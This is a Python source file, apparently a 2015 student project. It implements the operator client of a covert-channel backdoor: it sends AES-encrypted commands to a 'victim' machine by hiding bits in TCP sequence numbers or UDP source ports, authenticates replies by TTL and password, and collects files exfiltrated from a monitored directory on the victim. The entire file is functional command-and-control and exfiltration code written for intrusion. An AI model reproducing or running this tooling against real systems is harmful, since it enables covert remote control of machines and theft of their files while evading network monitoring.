'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    Client.py
--
--  AUTHORS:        Thilina Ratnayake (A00802338) & Elton Sia (A00800541)
--
--  PROGRAM:         Sends commands to the backdoor (Server.py) running on a
--                   victims machine. It also listens/receives the files that
--                   are changed /added in the directory monitored by the server
--
--  FUNCTIONS:
--
--
--  DATE:           28 Nov 2015
--
--  REVISIONS:
--
--  NOTES:
--  The program requires the Scapy library for packet crafting.
--  'pip install scapy' or http://www.secdev.org/projects/scapy/
--
--  The program requires the picrypto for use of encryption libraries (AES)
--  'pip install picrypto'
--
--	USAGE:
--  Ensure that the values have been changed in the configFile.txt with correct
--  IP addresses, encryption/decryption keys & initialization vectors (IV)
--
--	python Client.py

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

#Dependancies
from multiprocessing import Process
from scapy.all import *
from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
import uuid #Used to generate UID's
import os # Used for executing commands on shell.
import parseConfig
import time

# Parse configuration parameters from configuration file immediately upon running.
victimIP = parseConfig.victimIP
ttlKey = parseConfig.ttlKey
srcPort = parseConfig.srcPort
dstPort = parseConfig.dstPort
encryptionKey = parseConfig.encryptionKey
IV = parseConfig.IV
protocol = parseConfig.protocol
password = parseConfig.password
authentication = parseConfig.authentication
localIP = parseConfig.localIP
saveDir = parseConfig.saveDir
protocol = parseConfig.sendProtocol
messages = []



'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	sniffCommand()
--
--  Parameters:	None
--
--  Return Values:
--      String - None
--  Description:
--      Prompts user for commands, encrypts the command & routes flow to the
--      sendMessage() method which takes care of packetizing and acutally sending
--      the command. Immediately after sending, goes into the receive mode to
--      listen for the responses.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def sniffCommand():
    # Infinite loop, always switch between sending & listening
    while True:
        try:
            # Prompt user for the command they would like to execute on the
            # backdoor.
            command = raw_input("ENTER COMMAND: {}:".format(victimIP))
        except EOFError as e:
            print(e)
        #Print the command so that the user knows what they typed.
        print(command)
        # If the user types "exit". shutdown the program.
        if(command == "exit"):
            sys.exit()
        else:
            #Encrypt the command.
            encryptedCommand = encrypt(command)
            # Specify to the sendMessage funciton that we are sending on the
            # protocol as defined in the config file, the command & what type of
            # transmission it will be ( a command )
            sendmessage(protocol,encryptedCommand,"command")
            # Immediately after sending, start listening for responses.
            # The time-out has been set to 10 seconds so as to allow enough time
            # for responses to large commands (i.e. iptables -L ) to return.
            sniff(timeout=10, filter="ip", prn=handle)
            # After a response has been printed out to the user, flow of control
            # will be returned to go back to the beginning of the while loop.

def sniffFile():
    sniff(filter="ip and dst port 80", prn=receiveFile)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--                         TRANSMISSION METHODS                                --
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	sendMessage()
--
--  Parameters:	String - protocol, String - message, String - type
--
--  Return Values:
--      None
--  Description:
--      The main controller that invokes packetization & the sending of the
--      command packets.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def sendmessage(protocol,message,type):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    #1. Encrypt the message
	#message = encrypt(message)
    if(type == "command"):
        #2. Convert message to ASCII to bits
        message = messageToBits(message)
    elif(type == "file"):
        #2B. Convert the message to bits
        message = fileToBits(message)
    #3. Chunk message into the size appropriate for the procol
    chunks = chunkMessage(message,protocol)
    #4. Craft packets
    packets = craftPackets(chunks,protocol)
    #5. Send the packets
    if(len(packets) == 1):
        send(packets[0])
    else:
        for packet in packets:
    		send(packet)
    		pass


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	messageToBits()
--
--  Parameters:	String - Message
--
--  Return Values:	String - Bits
--
--  Description:
--      Takes any string and then breaks it down into bits.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def messageToBits(message):
    #Create the string that will hold all the bits.
    messageData =""
    #For each character in the string
    for c in message:
        #Get the ASCII value of each character, and convert that value to binary
        #Also zfill it to have a total length of 8 characters (needed for
        # packetizing later)
        var = bin(ord(c))[2:].zfill(8)
        #Concatenate with the placeholder
        messageData += str(var)
    return messageData

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	chunkMessage()
--
--  Parameters:	String - Message, String - Protocol
--
--  Return Values:
--      output[]  - An array that holds the bits of what will need to be stuffed
--                  into each packet.
--  Description:
--      Takes the string of bits that make up the message for the transmission
--      & chunks it based on the maximum amount of data that can be carried by
--      packets utilizing the specific protocol & covert channel.
--      E.g. Covert channel for UDP is storing data in the source port. Which
--      means only 16 bits of hidden data can be stored when using UDP.
--      TCP uses the sequence port field so up to 32 bits can be stored.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def chunkMessage(message,protocol):
    #Assign the max length based on the protocol
    if(protocol == "TCP"):
		length = 32
    elif(protocol == "UDP"):
		length = 16

    #If the data needing to be hidden is perfectly the size that can be carried,
    #Do nothing and append it to the output array.
    if(len(message) == length ):
        output = []
        output.append(message)
        return message
    #However, if its less than the max amount that can be carried by the packet/
    #protocol, then pad it to reach the max length.
    elif(len(message) <= length):
        # Pad so that the message is as long as the length
        message = message.zfill(length)
        return message
    #If the message length is greater than what can be stuffed into one packet,
    #then break it down into multiple chunks
    elif(len(message) > length):
        #Rounds are the amount of packets that can be filled with the data.
        rounds = len(message) / length
        #The excess is what will be left over
        excess = len(message) % length
        #Create the blank array that will hold the data for each packet.
        output = []
        #Markers that will be used for traversing the data.
        i = 0
        start = 0
        end = 0
        # While packets can be completely filled
        while(i < rounds):
            start = i*length
            end = (i*length)+(length - 1) #31
            output.append(message[start:end+1])
            i = i + 1
            # print "END OF ROUND " + str(output)
        #All the full packets have been created. Now to deal with the excess
        if(excess > 0):
            #Add the excess to the output array.
            output.append(message[(end+1):(end+1+excess)])
        # print output
        return output

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	craftPackets()
--
--  Parameters:	String - data (bits) , String - protocol
--
--  Return Values:
--      packets[] - Array of packets, that will be sent back to sendMessage()
-                   to send.
--  Description:
--      Generates a UID for the transmission, crafts the packet and appends to
--      the array, and adds in the position & total numbers.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def craftPackets(data,protocol):
    #Create the packets array as a placeholder.
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = generateUID()

    #If not an array (if there is only one packet.)
    if(type(data) is str):
        #The transmissions position and total will be 1.
        # i.e. 1/1 message to send.
        packets.append(craftPacket(data,protocol,counter+1,1,UID))
    #If an array (if there is more than one packet)
    elif(type(data) is list):
        while (counter < len(data)):
            #The position will be the array element and the total will be the
            # length.
            # i.e. 1/3 messages to send.
            packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID))
            counter = counter + 1

    return packets

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name: craftPacket()
--
--  Parameters:	String - data, String - protocol, String - position,
                String - total, String - UID
--
--  Return Values:
--      Packet
--  Description:
--     Crafts the packet according to protocol.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def craftPacket(data,protocol,position,total,UID):
    global victimIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    global password


    #If protocol is TCP, we stuff data inside the sequence number.
    #The payload contains the unique password, UID, position number and total.
    if(protocol == "TCP"):
        # print "Put Data " + str(int(data,2)) + "into Seq Number"
        packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
        seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+UID+"\n"+str(position)+":" \
        + str(total)))
    #If protocol is UDP, we stuff the data inside the source port.
    elif(protocol == "UDP"):
        packet = IP(dst=victimIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
        dport=dstPort)/Raw(load=encrypt(password+"\n"+UID+"\n"+ str(position) + \
         ":"+str(total)))
    return packet


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	generateUID()
--
--  Parameters:	None
--
--  Return Values:
--      String - Unique Identifier (UID). Which will be used to distinguish and
--               associate packets with a specific transmission.
--  Description:
--      Uses the python uuid module.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def generateUID():
    uid = uuid.uuid1()
    # print 'Made a UID ' + str(uid)
    return str(uid)


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--                              LISTENING METHODS                              --
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	handle
--
--  Parameters:	Packet
--
--  Return Values:
--      None
--  Description:
--      Handles incoming packets. If the packet auhenticates, extracts the per-
--      tinent information based on the protocol.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def handle(packet):
    #Only handle a packet if it contains an IP layer.
    if(packet.haslayer(IP)):
        # Don't handle any inbound packets that are looping back.
        if(packet[IP].src != localIP):
            #Authenticate the packet based on the pre-defined characteristics.
            if authenticate(packet):
                #Decrypt the payload and split on the newline characters
                payload = decrypt(packet["Raw"].load).split("\n")
                UID = payload[1]
                position = payload[2].split(":")[0]
                total = payload[2].split(":")[1]
                #Handle packet based on TCP rules
                if(packet.haslayer(TCP)):
                    #Define the length
                    length = 32
                    # DECRYPT THE COVERT CONTENTS?!?!?!
                    # Convert to binary
                    field = packet[TCP].seq
                    #Converts the bits to the nearest divisible by 8
                    covertContent = lengthChecker("TCP",field)
                elif(packet.haslayer(UDP)):
                    length = 16
                    # decrypt the covert contents
                    # convert to binary
                    field = packet[UDP].sport
                    covertContent = lengthChecker("UDP",field)
                #If there's more than one message associated with this
                #transmission, add it to our list of messages.
                if(total != 1):
                    #DEBUG: print "Multipart command, add to messages"
                    addToMessages(messages, UID, total, covertContent)
                    # Each time a message is added, check to see if the max/end
                    # of the transmission has been reached. e.g. message 3 out
                    # of 3
                    # If the max has been reached
                    if(checkMessages(UID)):
                        #Reconstruct the message
                        message = reconstructMessage(UID)
                        #Decrypt the full contents of the message here
                        decryptedMessage = decrypt(message)
                        #Dispaly the output to the user
                        print "OUTPUT: \n " + decryptedMessage
                        #Delete the packets belonging to the session from memory
                        deleteMessages(UID)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	authenticate()
--
--  Parameters:	Packet
--
--  Return Values:
--      Boolean - True if the packet matches the criteria
--
--  Description:
--      Checks that the packet contains the criteria we have set out for it to
--      distinguish it from random traffic to messages set for us from the back
--      door. Specifically, we look for TTL,& that there is a password in the
--      payload (which matches the configuration file)
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def authenticate(packet):
    global command
    global authentication
    # Check TTL first
    ttl = packet[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == ttlKey:
        # Check the password in the payload
        payload = packet["Raw"].load
        # Decrypt payload, sequence number
        decryptedData = decrypt(payload)
        # Check if password in payload is correct
        password = decryptedData.split("\n")[0]
        #password = payload[0]
        if(password == authentication):
            return True
        else:
            return False
    return False

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	addToMessages()
--
--  Parameters:	array[] messages, string - UID, int- total (the max amount),
                string - covertContent (the bits of the covertContent)
--
--  Return Values:
--      None
--  Description:
--      If there is a multi-packet message, it is added to a list that is
--      organized by UID
--  Messages are stored in the following format:
--  [
--      [UID
--          [total]
--              [content]]]
--  ]
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def addToMessages(messages, UID, total, covertContent):
    # Edge case if command array is empty
    if(len(messages) == 0):
        #'Commands is empty, creating a new element'
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)
    # If the messages array is NOT empty, search by UID
    else:
        #Check the current list of messages
        # if there is already some messages with the same UID
        # then append it to that.
        for x in range(len(messages)):
            if(messages[x][0] == UID):
                #"There is an existing element with same UID"
                messages[x][2].append(covertContent)
                return;
                # print messages
            pass
        # If NONE of the elements have the same UID, create a
        # new entry
        # print "There are no elements with the same UID"
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	checkMessages()
--
--  Parameters:	string - UID (Unique Identifier, identifies each transmission &
--              packets belonging to it.)
--
--  Return Values:
--      Boolean - True if all messages belonging to transmission have arrived.
-               - False if not all messages have arrived yet.
--  Description:
--      Check the list according to UID. If the the number of elements matches
--      the total, then all messagse have arrived.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def checkMessages(UID):
    #print "--Checking Commands--"
    #print(messages)
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            #print "ELEMENT = UID"
            total = element[1][0]
            #print "The total amount of messages is " + str(total)
            numMessages = len(element[2])
            #print "The number of messages is " + str(numMessages)
            if(numMessages == total):
                return True
    pass
    return False

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	reconstructMessage()
--
--  Parameters:	string - UID (Unique Identifier, identifies each transmission &
--              packets belonging to it.)
--
--  Return Values:
--      String - Output. The message sent back by the Backdoor.
--  Description:
--      Concatenates all the data elements in the messages list. Chunks them
--      into 8 bit chunks, parses the integer values and converts to their
--      ASCII equivalents to give us a human-readable string.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def reconstructMessage(UID):
    for element in messages:
        # Placeholder string
        text = ""
        # Check by UID.
        if(element[0] == UID):
            # If it's the element we're looking for, the data will be in elem 2
            data = element[2]
            for value in data:
                #Concatenate to the placeholder
                text = text + str(value)
                pass
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            #Convert each element in array to integer
            for x in range(0, len(chunks)):
                 chunks[x] = int(chunks[x], 2)
                 chunks[x] = chr(chunks[x])
            # print chunks
            return ''.join(chunks)
        pass


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	deleteMessages()
--
--  Parameters:	string - UID (Unique Identifier, identifies each transmission &
--              packets belonging to it.)
--
--  Return Values:
--      None
--  Description:
--      If all the packets for the transmission have arrived. Delete them as
--      they are no longer required.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def deleteMessages(UID):
    #For all messages in memory, check for the element matching UID
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            del messages[x]
    pass

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	receiveFile()
--
--  Parameters:	Packet
--
--  Return Values:
--      None
--
--  Description:
--      If receiving a file from the Backdoor, develops the output & writes it
--      to a file.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

def receiveFile(packet):
    if(packet.haslayer(IP)):
        if(packet[IP].src != localIP):
            if authenticate(packet):
                payload = decrypt(packet["Raw"].load).split("\n")
                UID = payload[1]
                position = payload[2].split(":")[0]
                total = payload[2].split(":")[1]
                if(packet.haslayer(TCP)):
                    #Define the length
                    length = 32
                    # convert to binary
                    field = packet[TCP].seq
                    #Converts the bits to the nearest divisible by 8
                    covertContent = lengthChecker("TCP",field)
                elif(packet.haslayer(UDP)):
                    length = 16
                    # convert to binary
                    field = packet[UDP].sport
                    covertContent = lengthChecker("UDP",field)
                if(total > 1):
                    #"Multipart command, add to messages"
                    addToMessages(messages, UID, total, covertContent)
                    # After every add, check if the max has been reached
                    if(checkMessages(UID)):
                        #If all the packets have been received, write it out
                        #to file
                        writeFile(UID)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	lengthChecker()
--
--  Parameters:	String -type, String - the field which contains the covert data.
--
--  Return Values:
--      String - covertContent
--
--  Description:
--      Often times, the data being sent or received are not uniform in length.
--      E.g. TCP packets using our covert channel can contain 32 bits of data
--      however, sometimes there may be 33 bits. This method takes the extra
--      bits and zfills them to the appropriate length.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def lengthChecker(type,field):
    covertContent = 0
    seqContent = bin(field)[2:]
    if (type == "TCP"):
        if len(seqContent) < 8:
            covertContent = bin(field)[2:].zfill(8)
        elif len(seqContent) > 8 and len(seqContent) < 16:
            covertContent = bin(field)[2:].zfill(16)
        elif len(seqContent) > 16 and len(seqContent) < 24:
            covertContent = bin(field)[2:].zfill(24)
        elif len(seqContent) > 24 and len(seqContent) < 32:
            covertContent = bin(field)[2:].zfill(32)
        else:
            return seqContent
    elif(type == "UDP"):
        if len(seqContent) < 8:
            covertContent = bin(field)[2:].zfill(8)
        elif len(seqContent) > 8 and len(seqContent) < 16:
            covertContent = bin(field)[2:].zfill(16)
        else:
            return seqContent
    return covertContent

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	writeFile()
--
--  Parameters:	String -UID
--
--  Return Values:
--      None
--
--  Description:
--      Once all the messages have been received, concatenate them together
--      and write it out to a file.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def writeFile(UID):
    for element in messages:
        text = ""
        bits = ""
        fileName = ""
        if(element[0] == UID):
            data = element[2]
            for value in data:
                text += str(value)
                pass
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            # print chunks
            #Convert each element in array to integer & letter.
            for x in range(0, len(chunks)):
                chunks[x] = int(chunks[x], 2)
                chunks[x] = chr(chunks[x])

            binaryString = ''.join(chunks)

            delimiter = binaryString.index('00000000')
            #Everything until the delimiter is the file name
            fileName = binaryString[0:delimiter]
            decryptedFileName = decrypt(fileName)

            fileContents = ''.join(chunks[delimiter+8:])
            print fileContents

            createFile = open(saveDir + decryptedFileName, 'w')
            createFile.write(fileContents)
            createFile.close()

            print "Wrote file " + decryptedFileName


'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	encrypt()
--
--  Parameters:	String Plaintext
--
--  Return Values:	String Ciphertext
--
--  Description:
--      Takes any plaintext string and encrypts it using AES CFB encryption using the
--      key and initialization vector (IV) specified in the config file
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

def encrypt(message):
    global encryptionKey
    global IV
    encryptionKey = encryptionKey
    IV = IV
    encryptor = AES.new(encryptionKey,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(message)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  Function Name:	decrypt()
--
--  Parameters:	String - Ciphertext
--
--  Return Values:	String - Plaintext
--
--  Description:
--      Takes any ciphertext string and decrypts it using AES CFB encryption
--      using the key and initialization vector (IV) specified in the config
--      file
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def decrypt(command):
    global encryptionKey
    global IV
    decryptor = AES.new(encryptionKey, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--                                     MAIN                                    --
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
if __name__ == "__main__":
    #Create a second process, this will be responsible for listening for files
    # that have been modified in the target directory and noticed/sent back by
    # the backdoor.
    fileProcess = Process(target=sniffFile)
    fileProcess.start()
    #In the main process, start the sniff command that asks users for commands
    # to run on the server and then sends to the server.
    sniffCommand()
